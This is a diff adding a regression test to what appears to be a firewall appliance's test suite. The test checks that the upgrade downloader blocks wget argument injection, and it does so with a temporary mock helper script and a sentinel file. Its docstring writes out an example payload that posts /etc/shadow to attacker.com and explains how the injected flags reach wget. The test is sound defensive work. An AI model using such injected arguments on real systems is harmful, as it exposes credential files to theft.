@@ -1221,6 +1221,76 @@ class UvmTests(NGFWTestCase):
         assert not os.path.exists(poc_file), \
             "Command injection succeeded via network settings DNS field (sentinel file was created)"
 
+    def test_125_wget_argument_injection_blocked(self):
+        """
+        Verify that downloadUpgrades() validates each URL before passing it to wget,
+        preventing wget argument injection attacks such as:
+
+            --post-file=/etc/shadow http://attacker.com
+
+        Attack surface: execEvil(String) in ExecManagerImpl splits the command string
+        using StringTokenizer (whitespace), so any wget flag embedded in the URL
+        becomes a real argv token received by wget.
+
+        The test temporarily replaces ut-system-mgr-helpers.sh so its downloadUpgrades
+        function outputs a crafted single-quoted entry:
+
+            '--output-file=<poc_file> http://127.0.0.1/'
+
+        After Java strips the surrounding single-quotes (line.substring(1, len-1)), the
+        remaining string is split by StringTokenizer into two tokens:
+            token 1: --output-file=<poc_file>
+            token 2: http://127.0.0.1/
+
+        wget treats token 1 as a real flag and writes its log to poc_file.
+        Crucially, --output-file creates the log file even when the HTTP connection
+        is refused, making this a reliable PoC indicator independent of network state.
+
+        With the fix (each URL validated against ^https?://\\S+$ before the wget
+        call): the malicious entry is rejected, wget is never invoked with the
+        injected flag, and the sentinel file is not created.
+        """
+        poc_file = "/tmp/wget_arg_injection_poc.txt"
+        helper_script = "/usr/share/untangle/bin/ut-system-mgr-helpers.sh"
+        backup_script = helper_script + ".bak_wget_injection_test"
+
+        subprocess.call(f"rm -f {poc_file}", shell=True)
+
+        # Mock script: downloadUpgrades outputs one malicious single-quoted entry.
+        # Real script format:  'https://repo.example.com/pkg.deb'
+        # Injected format:     '--output-file=<poc_file> http://127.0.0.1/'
+        # After Java strips quotes the injected flags reach wget as real argv tokens.
+        mock_script = (
+            "#!/bin/bash\n"
+            "downloadUpgrades()\n"
+            "{\n"
+            "    echo \"'--output-file=" + poc_file + " http://127.0.0.1/'\"\n"
+            "}\n"
+            "upgradesAvailable() { apt-get -s dist-upgrade | grep -q '^Inst'; }\n"
+            "diskHealthCheck() { python3 /usr/lib/python3/dist-packages/uvm/disk_health.py; }\n"
+            '$1 "$@"\n'
+        )
+
+        try:
+            subprocess.call(f"cp {helper_script} {backup_script}", shell=True)
+            with open(helper_script, 'w') as f:
+                f.write(mock_script)
+            subprocess.call(f"chmod +x {helper_script}", shell=True)
+
+            # downloadUpgrades() will return False (wget exit ≠ 0 for 127.0.0.1),
+            # but we only care whether the sentinel file was created.
+            global_functions.uvmContext.systemManager().downloadUpgrades()
+        finally:
+            subprocess.call(f"mv {backup_script} {helper_script}", shell=True)
+
+        time.sleep(1)
+        assert not os.path.exists(poc_file), (
+            "wget argument injection succeeded: the injected --output-file flag was "
+            "accepted by wget (sentinel file created at " + poc_file + "). "
+            "Each URL must be validated against ^https?://\\S+$ before being passed "
+            "to execEvil() in SystemManagerImpl.downloadUpgrades()."
+        )
+
     def test_130_check_cmd_connected(self):
         """Check if cmd is connected using alert rule"""
         # Enable cloud connection  
